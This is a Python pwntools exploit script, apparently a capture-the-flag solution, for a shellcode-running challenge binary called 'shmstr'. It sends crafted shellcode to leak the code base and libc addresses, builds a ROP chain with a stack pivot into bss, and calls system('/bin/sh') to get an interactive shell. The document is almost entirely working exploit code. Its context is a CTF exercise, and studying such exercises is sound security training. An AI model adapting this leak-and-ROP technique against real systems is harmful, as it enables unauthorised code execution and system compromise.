from pwn import *

io = process("./shmstr",env={"LD_PRELOAD":"./libc.so"})

def add(shell):
    io.sendlineafter("> ","1")
    io.sendafter("{?} Enter shellcode: ",shell)

def view(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def delete(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter("{?} Enter idx: ",str(idx))

def run(idx,arg):
    io.sendlineafter("> ","4")
    io.sendlineafter("{?} Enter idx: ",str(idx))
    io.sendlineafter("{?} Enter shellcode argument: ",str(arg))


if __name__ == "__main__":
    payload = asm("""
                    push ebx
                    pop eax
                    push eax
                    pop eax
                    push eax
                    pop eax
    """)

    #print(payload)

    add(payload)
    run(0,551)

    io.recvuntil("{!} Shellcode return code = ")
    leak = int(io.recvline().strip())
    log.info("leak @ " + hex(leak))
    code = leak - 0x3f9c
    pop_ebx = code + 0x1022
    puts = code + 0x1190
    got = code + 0x3fbc
    run_shellcode = code + 0x173d
    read = code + 0x00001130

    payload = asm("""
              pop edx
              pop edx
              push ebp
              dec ecx
              dec ecx
              push edx
    """)
    #print(payload)

    delete(0)
    add(payload)

    payload2 = asm("""
              pop edx
              pop edx
              push esp
              dec ecx
              dec ecx
              push edx
    """)
    add(payload2)
    run(0, leak - 9849)
    ret = code + 0x0000100e
    push_esp = code + 0x00001244
    pop_ebp = code + 0x000019d3
    rop = p32(code + 0x4070)
    bss = code + 0x4090 + 0x500
    leave = code + 0x00001291
    rop += flat([
        puts,
        pop_ebp,
        got,
        read,
        pop_ebp-2,
        0,
        bss,
        0x1000,
        pop_ebp,
        bss-0x4,
        leave
    ])
    gdb.attach(io)
    io.sendline(rop)

    leak2 = u32(io.recv(4))
    leak3 = u32(io.recv(4))
    libc = leak2 - 0x702c0
    system = libc + 0x3a950
    log.info("leak @ " + hex(leak2))
    log.info("leak @ " + hex(leak3))
    binsh = code + 0x409c + 0x500
    pay = p32(pop_ebx) + p32(0) + p32(system) + p32(0xdeadbeef) + p32(binsh+8) + "/bin/sh\x00"
    io.sendline(pay)
    io.interactive()
